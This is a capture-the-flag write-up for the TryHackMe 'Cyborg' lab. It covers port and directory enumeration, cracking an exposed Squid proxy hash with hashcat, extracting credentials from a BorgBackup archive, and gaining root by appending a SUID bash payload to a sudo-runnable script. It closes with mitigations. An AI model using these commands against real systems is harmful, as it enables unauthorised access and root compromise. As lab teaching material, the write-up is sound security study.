# Cyborg — TryHackMe CTF Writeup

- **OS:** Linux (Ubuntu)
- **Target IP:** `10.64.135.58`

---

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -A 10.64.135.58
```

**Output:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

Two open ports were found:

- **22** — SSH
- **80** — Apache web server (default Ubuntu page)

### Directory Enumeration

```bash
gobuster dir --url http://10.64.135.58:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Output:**

```
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/admin                (Status: 301) [Size: 312] [--> http://10.64.135.58/admin/]
/etc                  (Status: 301) [Size: 310] [--> http://10.64.135.58/etc/]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 277]
```

Two interesting directories were discovered: `/admin` and `/etc`.

### Information Disclosure via `/etc` and `/admin`

Browsing to `http://10.64.135.58/etc/` revealed two files belonging to a Squid proxy configuration:

- `squid/passwd`
- `squid/squid.conf`

The `passwd` file contained an Apache MD5 hash:

```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

The `squid.conf` file showed that basic proxy authentication was enforced and tied to the above credentials file:

```
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

Navigating to `http://10.64.135.58/admin/admin.html` revealed an internal employee chat. Notably, a user named **Alex** admitted to poorly configuring the Squid proxy and leaving all the config files exposed, mentioning that a backup called `music_archive` should be safe.

---

## Credential Cracking

The hash extracted from `squid/passwd` was saved and cracked using Hashcat with mode `1600` (Apache `$apr1$` MD5):

```bash
hashcat -m 1600 target.hash /usr/share/seclists/Passwords/rockyou.txt
```

**Result:**

```
$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward
```

The password for the `music_archive` user was cracked as **`squidward`**.

---

## Exploitation

### BorgBackup Archive Extraction

The `/admin` page also contained a download section with a file named `archive.tar`. After downloading and extracting it, the contents revealed a **BorgBackup** encrypted repository, with the following configuration inside:

```
[repository]
version = 1
id = ebb1973fa0114d4ff34180d1e116c913d73ad1968bf375babd0259f74b848d31
key = hqlhbGdvcml0aG2mc2hhMjU2pGRhdGH...
```

BorgBackup was installed on the local Debian machine, and the cracked password `squidward` was used to unlock and mount the repository:

```bash
sudo apt install borgbackup
borg list ./home/field/dev/final_archive
borg extract ./home/field/dev/final_archive::music_archive_013
```

The extracted archive contained the home directory of user **alex**, including the file `/home/alex/Documents/note.txt`, which contained plaintext credentials:

```
alex:S3cretP@s3
```

### SSH Access as `alex`

Using the credentials found inside the backup:

```bash
ssh alex@10.64.135.58
```

A stable shell was obtained as `alex`. The `user.txt` flag was readable from `/home/alex/`.

---

## Privilege Escalation

### Sudo Misconfiguration — World-Writable Backup Script

Running `sudo -l` as alex revealed:

```
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

Alex could run `/etc/mp3backups/backup.sh` as root without a password. Although the file was set to read-only, **alex was the owner** of the script, making it possible to modify its permissions:

```bash
chmod +w /etc/mp3backups/backup.sh
```

A SUID copy of bash was injected into the script:

```bash
echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> /etc/mp3backups/backup.sh
```

The script was then executed with sudo:

```bash
sudo /etc/mp3backups/backup.sh
```

Finally, a root shell was spawned via the SUID bash copy:

```bash
/tmp/rootbash -p
```

The root flag was retrieved from `/root/root.txt`.

---

## Key Takeaways

The attack chain exploited a series of misconfigurations and poor security hygiene in sequence. First, sensitive Squid proxy configuration files were left exposed in a publicly accessible web directory, leaking an Apache MD5 hash that was cracked offline using a common wordlist. Second, a downloadable BorgBackup archive — referenced in an internal employee chat — contained the home directory of user alex, including a note with cleartext credentials that enabled SSH access. Third, a backup script was executable as root via a `NOPASSWD` sudo rule, but remained world-writable by its owner, allowing arbitrary command injection that led to full root compromise.

Mitigations include: never exposing service configuration files through a web server, enforcing strong and unique passwords for all services, storing sensitive backups outside the web root with strict access controls, and auditing sudo rules to ensure scripts executed as root cannot be modified by unprivileged users.

---

## Tools Summary

| Tool | Purpose |
|------|---------|
| Nmap | Port discovery and service/version detection |
| Gobuster | Web directory enumeration |
| Hashcat (mode 1600) | Cracking Apache MD5 (`$apr1$`) hash |
| BorgBackup | Mounting and extracting encrypted backup repository |
| SSH | Remote access with discovered credentials |
| chmod / bash SUID | Privilege escalation via writable sudo script |
